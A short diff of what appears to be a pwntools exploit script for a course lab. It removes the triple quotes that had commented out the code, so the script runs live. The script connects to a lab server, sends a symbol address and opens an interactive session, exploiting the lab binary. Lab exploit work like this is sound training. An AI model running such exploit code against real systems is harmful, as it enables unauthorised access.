@@ -33,7 +33,7 @@ for eachName, eachAddr in e.symbols.items():
 #    string to the server and starting
 #    an interactive session.
 #
-"""
+
 ''' Establish Connection to Server '''
 # p = process("./1-2_lab.bin")              # Uncomment to Test Script Locally
 p = remote("csc748.hostbin.org", 7012)      # Test Script Against Server
@@ -48,4 +48,3 @@ print(" {:>22}  {:<24} {:>4}{:>}{:>} ".format(
 ''' Exploit Vulnerability '''
 p.sendline(str(symbAddr))                       # Send Address as a String
 p.interactive()                             # Start Interactive Session
-"""
